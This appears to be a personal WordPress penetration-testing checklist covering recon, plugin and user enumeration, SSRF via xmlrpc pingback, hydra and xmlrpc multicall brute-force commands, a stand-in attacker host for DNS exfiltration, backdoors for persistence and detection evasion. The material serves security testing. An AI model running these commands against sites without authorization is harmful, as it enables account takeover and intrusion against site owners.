# Wordpress Pentesting

## 1. Reconnaissance
- [ ] Gather domain and site information
  - [ ] Identify WordPress installation (e.g., via meta tags or default files)
  - [ ] Check for exposed admin panel (/wp-admin/)
- [ ] **Version exposure**
  - [ ] Inspect meta generator tag: 
```bash
curl -s https://example.com | grep -i '<meta name="generator"' | grep -o 'WordPress[^"]*'
```
  - [ ] Check `/readme.html`, `/license.txt` for version details
  - [ ] Cross-reference version with NVD for known vulnerabilities
- [ ] **Banner grabbing**
  - [ ] Retrieve server headers: `curl -I https://example.com`
  - [ ] Check for PHP/Nginx/Apache versions in responses (e.g., on non-existent pages like /x.php)
- [ ] **Information disclosure**
  - [ ] Review `robots.txt `for disallowed paths
  - [ ] Check `/wp-includes/` for server details
  - [ ] Look for debug logs:` /wp-content/debug.log`
  - [ ] Test non-existent paths for error messages revealing info
  > [!note] use `wp-json` route to identify the publicly accessible routes 
    >> [!example] `/wp-json/performance-monitor/v1/system_info`
- [ ] **Default pages exposure**
  - [ ] Access `/readme.html`, `/wp-admin/upgrade.php`, `/wp-admin/install.php`, `/wp-mail.php`, `/wp-admin/setup-config.php`
  - [ ] Note any misconfigurations or leftover files
- [ ] **Directory listing**
  - [ ] Test directories like `/wp-content` and `/wp-content/uploads/`for enabled listings
- [ ] **Enumerate plugins**
  - [ ] Scan for plugin paths: `wp-content/plugins/`
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://example.com/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
  - [ ] Check plugin versions via /wp-content/plugins/[plugin]/readme.txt
  - [ ] Use WPScan: 
```bash
wpscan --url https://example.com --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive --api-token <token> --random-user-agent
```
- [ ] **Enumerate themes**
  - [ ] Scan for theme paths: `wp-content/themes`
```bash
curl -s -X GET https://example.com | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
  - [ ] Check theme versions via /wp-content/themes/[theme]/readme.txt
  - [ ] Use WPScan: `wpscan --url https://example.com --wp-content-dir /wp-content/ --enumerate vt --plugins-detection aggressive --api-token <token> --random-user-agent`
- [ ] **User enumeration**
  - [ ] Via oEmbed: `https://example.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fexample.com%2F&format=xml` (check author_name)
  - [ ] Via login form: Test responses for existing vs. non-existing users (e.g., "Invalid username" vs. "Incorrect password")
  - [ ] Via author parameter:
```bash
for i in {1..100}; do curl -s -L -i http://example.com/?author=$i | grep -E -o "\" title=\"View all posts by [a-zA-Z0-9\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"; done
```
  - [ ] Via REST API: /wp-json/wp/v2/users (list exposed users)
- [ ] **Check for exposed *xmlrpc.php***
  - [ ] Test accessibility: POST to /xmlrpc.php with system.listMethods
> [!note] XMLRPC is commonly used for  
>> Remote content publishing
>>Integration with mobile apps
>> Communication with external services like Jetpack


## 2. Scanning
- [ ] **Vulnerable plugins and themes**
  - [ ] Cross-reference enumerated plugins/themes with NVD or WPScan results for CVEs
  - [ ] Focus on outdated or known vulnerable ones (e.g., Contact Form 7, Elementor)
- [ ] **Misconfigured TLS/SSL**
  - [ ] Scan for deprecated protocols (SSLv3, TLS 1.0/1.1) using tools like SSL Labs or testssl.sh
  - [ ] Check for weak ciphers (RC4, 3DES, CBC modes)
- [ ] **Missing security headers**
  - [ ] Inspect responses for absence of X-XSS-Protection, X-Frame-Options, Content-Security-Policy, etc.
    - [ ] example of proper security headers: ![[Pasted image 20260103162624.png]] 
- [ ] **CORS misconfiguration**
  - [ ] Test if Access-Control-Allow-Origin reflects arbitrary Origins
- [ ] **Improper error handling**
  - [ ] Trigger errors (e.g., via oEmbed or `/wp-links-opml.php`) to check for verbose disclosures
  - [ ] Attempt to download debug logs `/wp-content/debug.log`
/gitcomm
## 3. Enumeration and Exploitation
- [ ] **HyperLink Injection (HLI)** in plugins (e.g., Contact Form 7)
  - [ ] Test contact forms by injecting malicious URLs in fields like Name/Cognome
  - [ ] Verify if auto-response emails include injected hyperlinks for phishing
- [ ] **Server-Side Request Forgery (SSRF)** via xmlrpc.php
  - [ ] <mark style="background: #FFB86CA6;">Enumerate methods</mark>: POST with `system.listMethods`, look for pingback.ping
    - [ ]  ![[Pasted image 20260103152902.png]]
  - [ ] Exploit: POST with `pingback.ping` to request internal/external resources 
    - [ ] ![[Pasted image 20260103153027.png]]
- [ ] **Server-Side DNS Exfiltration (Blind)**
  - [ ] Inject crafted inputs (e.g., email like test@attacker.oastify.com) in forms/plugins (e.g., HubSpot)
  - [ ] Monitor for outbound DNS queries confirming exfiltration
- [ ] **Host Header Redirection**
  - [ ] Modify Host header in requests to check if redirects use it insecurely
  - [ ] Attempt to redirect to attacker-controlled domains
- [ ] **Brute-force authentication**
  - [ ] Via login form (no rate limits/CAPTCHA): `wp-login.php`
    - [ ] `hydra -l <user> -P passwords.txt example.com http-post-form "/?wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V`
  - [ ] Via xmlrpc.php: POST with **system.multicall** and **wp.getUsersBlogs** for credential validation
    - [ ] ![[Pasted image 20260103154443.png]]
     > [!example]
```xml
POST /xmlrpc.php HTTP/1.1
Host: domain-fake.com
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>test</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```
- [ ] **Exploit identified vulnerabilities**
  - [ ] For plugins/themes: Follow CVE-specific exploits (e.g., code execution, XSS)
  - [ ] Combine SSRF with DNS exfiltration for data leakage
- [ ] **Admin panel attacks**
  - [ ] If exposed, attempt phishing or credential stuffing post-enumeration
    - [ ] `/wp-login.php?reauth=1&redirect_to=`
    - [ ] `/wp-login-secure.php?redirect_to=`

## 4. Post-Exploitation and Reporting
- [ ] **Maintain access** (if applicable, e.g., via backdoors in exploited plugins)
- [ ] **Document findings**
  - [ ] List all vulnerabilities with proof-of-concept (commands, responses)
  - [ ] Recommend mitigations: Update WordPress/plugins/themes, disable xmlrpc.php if unused, enable security headers, rate limiting
- [ ] **Retest after fixes**

**Notes:** 
- Use random user agents and proxies to avoid detection.
- Reference WPScan API for vulnerability databases.
- Focus on impactful issues in modern setups; avoid basic scans only.
